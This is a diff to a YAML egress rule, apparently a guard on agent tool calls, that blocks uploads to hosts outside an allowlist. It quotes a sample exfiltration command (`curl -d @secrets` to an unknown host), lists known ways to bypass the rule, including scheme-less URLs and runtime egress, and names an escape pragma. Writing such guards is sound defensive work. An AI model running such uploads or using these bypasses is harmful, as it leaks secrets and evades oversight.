@@ -10,8 +10,9 @@ description: >
   is left alone -- the target is upload to an unapproved host, not normal dependency traffic.
   This is a tool-time FLOOR, not a network sandbox: it stops the obvious `curl -d @secrets
   https://unknown` reflex; containing a determined adversary needs real sandboxing. Known
-  bypass classes include combined short flags, obfuscated payloads, non-standard clients, and
-  egress via a language runtime. Escape: 'pragma: allowlist egress' on the line.
+  bypass classes include scheme-less URL targets (host extraction needs the http(s):// prefix),
+  combined short flags, obfuscated payloads, non-standard clients, and egress via a language
+  runtime. Escape: 'pragma: allowlist egress' on the line.
 artifact: rule
 enforcement: advise
 rule:
@@ -53,4 +54,4 @@ changelog:
 - version: 0.0.1
   date: '2026-08-26'
   changes:
-  - "Initial public baseline: block a network client that uploads data (POST/PUT, --data/--form/--upload-file/--post-file) to a host outside the editable ALLOWED_HOSTS list; fetch-only and allowlisted-host uploads pass; 'pragma: allowlist egress' escapes. Tool-time floor, explicitly not a network sandbox (from the chock-threat-intel baseline)."
+  - "Initial public baseline: block a network client that uploads data (POST/PUT, --data/--form/--upload-file/--post-file) to a host outside the editable ALLOWED_HOSTS list; fetch-only and allowlisted-host uploads pass; 'pragma: allowlist egress' escapes. Tool-time floor, explicitly not a network sandbox (from the chock-threat-intel baseline). Hardening from first review: attached short-flag values (-d@file, -Tbackup.tar) are caught; curl short flags matched case-sensitively so fetch flags -f/-D/-t are no longer mistaken for -F/-d/-T uploads; a printer as the first word (echo) no longer excuses a later segment in a compound command; scheme-less URL targets documented as a known bypass."
